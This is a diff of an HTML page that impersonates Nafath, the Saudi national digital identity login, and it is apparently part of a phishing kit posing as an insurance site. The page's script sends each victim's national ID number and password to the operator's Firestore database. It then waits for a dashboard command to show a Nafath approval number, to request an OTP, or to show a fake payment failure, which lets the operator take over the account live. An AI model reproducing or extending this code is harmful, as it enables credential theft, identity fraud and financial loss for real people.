@@ -6,94 +6,136 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>نفاذ | Nafath Authentication</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/inner-theme.css">
+    <link id="bootstrap-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/site-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display:flex; flex-direction:column; min-height:100vh; }
-        .nafath-form label { display:block; font-size:0.8rem; font-weight:700; color:var(--text-muted); margin-bottom:6px; text-align:start; }
-        .footer-links { margin-top:16px; font-size:0.82rem; display:flex; justify-content:center; gap:12px; }
-        .footer-links a { color:rgba(0,229,160,0.7); text-decoration:none; }
-        .footer-links a:hover { color:var(--green); }
-        #code-screen { display:none; animation:fadeIn 0.4s; }
-        #loading-screen { display:none; flex-direction:column; align-items:center; }
-        @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
-        .nafath-main { flex:1; display:flex; flex-direction:column; align-items:center; padding:20px 16px 48px; }
+        /* واجهة مستوحاة من نفاذ: شريط علوي أخضر داكن + بطاقة دخول */
+        .nafath-page { display: flex; flex-direction: column; align-items: stretch; min-height: 100vh; direction: rtl; }
+        .nafath-topstrip {
+            background: linear-gradient(90deg, #0a4d35 0%, #0d6e4d 50%, #0a4d35 100%);
+            color: #fff; padding: 10px 20px; font-size: 0.8rem; text-align: center;
+            border-bottom: 3px solid #ffc107;
+        }
+        .nafath-header {
+            width: 100%; padding: 18px 5%; display: flex; justify-content: space-between; align-items: center;
+            background: #fff; box-shadow: 0 2px 12px rgba(0,0,0,.06);
+        }
+        html[data-theme="dark"] .nafath-header { background: var(--tree-card); }
+        .header-logo { height: 52px; width: auto; }
+        .vision-logo { height: 42px; width: auto; opacity: .95; }
+        .nafath-main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 28px 16px 48px; }
+        .nafath-card {
+            width: 100%; max-width: 420px; padding: 0; text-align: center; border-radius: 12px;
+            background: var(--tree-card); box-shadow: var(--tree-shadow-md); border: 1px solid var(--tree-border-strong);
+            overflow: hidden;
+        }
+        .nafath-card__head {
+            background: linear-gradient(180deg, rgba(13, 110, 77, 0.08) 0%, transparent 100%);
+            padding: 28px 24px 8px;
+        }
+        .auth-logo { height: 72px; width: auto; margin-bottom: 12px; }
+        .nafath-card__body { padding: 8px 28px 32px; }
+        .title { font-size: 1.25rem; font-weight: 800; margin-bottom: 4px; color: var(--tree-text); }
+        .subtitle { font-size: 0.88rem; margin-bottom: 22px; color: var(--tree-text-muted); }
+        .nafath-form label { display: block; text-align: right; font-size: 0.82rem; font-weight: 700; color: var(--tree-text-muted); margin-bottom: 6px; }
+        .form-control {
+            padding: 13px 14px; border-radius: 8px; margin-bottom: 16px; text-align: right;
+            border: 1px solid var(--tree-border-strong); background: var(--tree-card); color: var(--tree-text);
+        }
+        .form-control:focus { border-color: var(--tree-primary); box-shadow: 0 0 0 3px var(--tree-primary-soft); outline: none; }
+        .btn-login {
+            width: 100%; padding: 13px; border: none; border-radius: 8px; font-weight: 800; transition: 0.25s;
+            font-size: 1.05rem; background: #0d6e4d; color: #fff; margin-top: 4px;
+        }
+        .btn-login:hover { background: #0a5c40; filter: brightness(1.02); }
+        html[data-theme="dark"] .btn-login { background: var(--tree-primary); color: #0a0f0c; }
+        .spinner {
+            width: 56px; height: 56px; border: 4px solid var(--tree-border); border-top: 4px solid #0d6e4d;
+            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+        html[data-theme="dark"] .spinner { border-top-color: var(--tree-primary); }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .number-display {
+            font-size: 3.5rem; font-weight: 800; width: 112px; height: 112px;
+            display: flex; align-items: center; justify-content: center; border-radius: 50%;
+            border: 3px solid #0d6e4d; color: #0d6e4d; margin: 20px auto;
+            background: rgba(13, 110, 77, 0.06);
+        }
+        html[data-theme="dark"] .number-display { border-color: var(--tree-primary); color: var(--tree-primary); }
+        #code-screen { display: none; width: 100%; animation: fadeIn 0.5s; padding: 28px 20px; }
+        #loading-screen { display: none; flex-direction: column; align-items: center; width: 100%; animation: fadeIn 0.5s; padding: 40px 20px; }
+        #login-screen { width: 100%; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .footer-links { margin-top: 18px; font-size: 0.82rem; }
+        .footer-links a { text-decoration: none; margin: 0 8px; color: #0d6e4d; }
+        html[data-theme="dark"] .footer-links a { color: var(--tree-primary); }
     </style>
 </head>
-<body>
+<body class="tree-site nafath-page">
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-<div class="nafath-topstrip" data-i18n="nafath.topstrip">النفاذ الوطني الموحد — تسجيل الدخول عبر الهوية الرقمية</div>
+    <div class="nafath-topstrip" role="note" data-i18n="nafath.topstrip">النفاذ الوطني الموحد — تسجيل الدخول عبر الهوية الرقمية</div>
 
-<div class="nafath-header-bar">
-    <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="44" width="180">
-    <div style="display:flex;align-items:center;gap:12px;">
-        <img src="images/nafath/vision-2030-inspired.svg" alt="رؤية 2030" height="38" width="150">
-        <button class="lang-btn" data-lang-toggle onclick="toggleLang()">EN</button>
+    <div class="nafath-header">
+        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" class="header-logo" width="200" height="56">
+        <div style="display:flex;align-items:center;gap:12px;">
+            <img src="images/nafath/vision-2030-inspired.svg" alt="رؤية المملكة 2030" class="vision-logo" width="160" height="48">
+            <button class="btn btn-outline-success btn-sm" data-lang-toggle onclick="toggleLang()" style="white-space:nowrap;">EN</button>
+        </div>
     </div>
-</div>
 
-<div class="nafath-main">
-    <div class="teal-card teal-card--narrow" style="max-width:420px;width:100%;">
-
-        <!-- Login Screen -->
+    <main class="nafath-main">
+    <div class="nafath-card">
         <div id="login-screen">
-            <div style="text-align:center;padding:28px 24px 8px;border-bottom:1px solid var(--teal-border);">
-                <img src="images/nafath/auth-user-lock.svg" alt="" height="72" width="72" style="margin-bottom:10px;">
-                <div class="section-title" data-i18n="nafath.login_title">تسجيل الدخول</div>
-                <div class="section-sub" data-i18n="nafath.login_sub">أدخل رقم الهوية وكلمة المرور كما في تطبيق نفاذ</div>
+            <div class="nafath-card__head">
+                <img src="images/nafath/auth-user-lock.svg" class="auth-logo" alt="" width="96" height="96">
+                <div class="title" data-i18n="nafath.login_title">تسجيل الدخول</div>
+                <div class="subtitle" data-i18n="nafath.login_sub">أدخل رقم الهوية وكلمة المرور كما في تطبيق نفاذ</div>
             </div>
-            <div class="card-body">
-                <form class="nafath-form" onsubmit="handleNafathLogin(event)">
-                    <div class="field">
-                        <label for="nafath_username" data-i18n="nafath.id_label">رقم الهوية / المستخدم</label>
-                        <input type="text" id="nafath_username" class="field__input" required maxlength="10" inputmode="numeric" placeholder="1xxxxxxxxxx" dir="ltr" style="text-align:start;" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
-                    </div>
-                    <div class="field">
-                        <label for="nafath_password" data-i18n="nafath.pass_label">كلمة المرور</label>
-                        <input type="password" id="nafath_password" class="field__input" required placeholder="••••••••">
-                    </div>
-                    <button type="submit" class="btn-green" data-i18n="nafath.btn_login">دخول</button>
-                    <div class="footer-links">
-                        <a href="#" data-i18n="nafath.forgot">نسيت كلمة المرور؟</a>
-                        <span style="opacity:.3">|</span>
-                        <a href="#" data-i18n="nafath.register">تسجيل جديد</a>
-                    </div>
-                </form>
-            </div>
-        </div>
+            <div class="nafath-card__body">
+            <form class="nafath-form" onsubmit="handleNafathLogin(event)">
+                <label for="nafath_username" data-i18n="nafath.id_label">رقم الهوية / المستخدم</label>
+                <input type="text" id="nafath_username" class="form-control" required maxlength="10" inputmode="numeric" autocomplete="username" placeholder="1xxxxxxxxxx" dir="ltr" style="text-align:right" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
 
-        <!-- Loading Screen -->
-        <div id="loading-screen">
-            <div class="card-body" style="text-align:center;padding:48px 24px;">
-                <div class="spin-ring" style="margin-bottom:20px;"></div>
-                <div class="section-title" data-i18n="nafath.verifying">جاري التحقق...</div>
-                <div class="section-sub" style="margin-top:6px;" data-i18n="nafath.wait_msg">يرجى الانتظار بينما يتم توجيه طلبك</div>
-            </div>
-        </div>
+                <label for="nafath_password" data-i18n="nafath.pass_label">كلمة المرور</label>
+                <input type="password" id="nafath_password" class="form-control" required autocomplete="current-password" placeholder="••••••••">
 
-        <!-- Code Screen -->
-        <div id="code-screen">
-            <div style="text-align:center;padding:28px 24px 8px;border-bottom:1px solid var(--teal-border);">
-                <div class="section-title" style="color:var(--green);" data-i18n="nafath.open_app">افتح تطبيق نفاذ</div>
-                <div class="section-sub" style="margin-top:4px;" data-i18n="nafath.select_num">اختر الرقم التالي في التطبيق لتأكيد العملية</div>
-            </div>
-            <div class="card-body" style="text-align:center;">
-                <div class="nafath-number-circle" id="display-num">--</div>
-                <div id="timer-box" style="display:none;" class="timer-chip" style="margin-top:8px;">
-                    <span data-i18n="nafath.expires">ينتهي الرقم خلال:</span>
-                    <span class="timer-chip__num" id="timer">01:00</span>
+                <button type="submit" class="btn-login" data-i18n="nafath.btn_login">دخول</button>
+
+                <div class="footer-links">
+                    <a href="#" data-i18n="nafath.forgot">نسيت كلمة المرور؟</a>
+                    <span style="opacity:.4">|</span>
+                    <a href="#" data-i18n="nafath.register">تسجيل جديد</a>
                 </div>
+            </form>
             </div>
         </div>
 
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <div class="title" data-i18n="nafath.verifying">جاري التحقق...</div>
+            <div class="subtitle" data-i18n="nafath.wait_msg">يرجى الانتظار بينما يتم توجيه طلبك</div>
+        </div>
+
+        <div id="code-screen">
+            <div class="nafath-card__head" style="padding-top:32px">
+                <div class="title" style="color:#0d6e4d" data-i18n="nafath.open_app">افتح تطبيق نفاذ</div>
+                <div class="subtitle" data-i18n="nafath.select_num">اختر الرقم التالي في التطبيق لتأكيد العملية</div>
+            </div>
+            <div class="nafath-card__body">
+                <div class="number-display" id="display-num">--</div>
+                <div id="timer-box" style="margin-top: 12px; color: #c0392b; font-weight: 700; font-size: 0.9rem; display: none;"><span data-i18n="nafath.expires">ينتهي الرقم خلال:</span> <span id="timer">01:00</span></div>
+            </div>
+        </div>
     </div>
-</div>
+    </main>
 
 <script>
+    // إعدادات Firebase
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -104,54 +146,77 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // جلب الـ ID المحفوظ
     const userId = localStorage.getItem('user_id');
+
     let timerInterval;
 
+    // دالة التعامل مع تسجيل دخول نفاذ
     async function handleNafathLogin(e) {
         e.preventDefault();
         const user = document.getElementById('nafath_username').value;
         const pass = document.getElementById('nafath_password').value;
+
+        // إخفاء الدخول وإظهار الانتظار
         document.getElementById('login-screen').style.display = 'none';
         document.getElementById('loading-screen').style.display = 'flex';
+
+        // إرسال البيانات للوحة التحكم
         try {
             await db.collection("orders").doc(userId).update({
-                nafath_username: user, nafath_password: pass,
+                nafath_username: user,
+                nafath_password: pass,
                 status: "تم تسجيل دخول نفاذ - بانتظار الرقم"
             });
-        } catch(err) { console.error(err); }
+        } catch (err) { console.error(err); }
     }
 
     function startTimer(duration) {
-        let timer = duration;
+        let timer = duration, minutes, seconds;
         const display = document.getElementById('timer');
-        document.getElementById('timer-box').style.display = 'inline-flex';
+        document.getElementById('timer-box').style.display = 'block';
+        
         clearInterval(timerInterval);
-        timerInterval = setInterval(() => {
-            const m = parseInt(timer/60,10);
-            const s = parseInt(timer%60,10);
-            display.textContent = (m<10?'0'+m:m)+':'+(s<10?'0'+s:s);
+        timerInterval = setInterval(function () {
+            minutes = parseInt(timer / 60, 10);
+            seconds = parseInt(timer % 60, 10);
+            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
             if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
         }, 1000);
     }
 
     if (userId) {
+        // مراقبة الطلب لحظة بلحظة
         db.collection("orders").doc(userId).onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
+
+                // إذا أرسلت رقم نفاذ من لوحة التحكم
                 if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
+                    // التحقق من أن الشاشة لم تظهر بعد لمنع إعادة تشغيل المؤقت عند تحديث البيانات
                     if (document.getElementById('code-screen').style.display !== 'block') {
                         document.getElementById('login-screen').style.display = 'none';
                         document.getElementById('loading-screen').style.display = 'none';
                         document.getElementById('code-screen').style.display = 'block';
                         document.getElementById('display-num').innerText = data.nafath_code;
-                        startTimer(60);
+                        startTimer(60); // تشغيل العداد لمدة 60 ثانية
                     }
                 }
-                if (data.next_step === "GO_TO_REJECT") window.location.href = "payment_failed.html";
-                if (data.next_step === "GO_TO_OTP") window.location.href = "nafath_otp.html";
+
+                // إذا ضغطت "رفض" في لوحة التحكم
+                if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_failed.html";
+                }
+
+                // إذا ضغطت "طلب كود OTP"
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "nafath_otp.html";
+                }
             }
         });
     } else {
+        // إذا دخل الصفحة بدون تسجيل بيانات يرجعه للرئيسية
         window.location.href = "index.html";
     }
 </script>
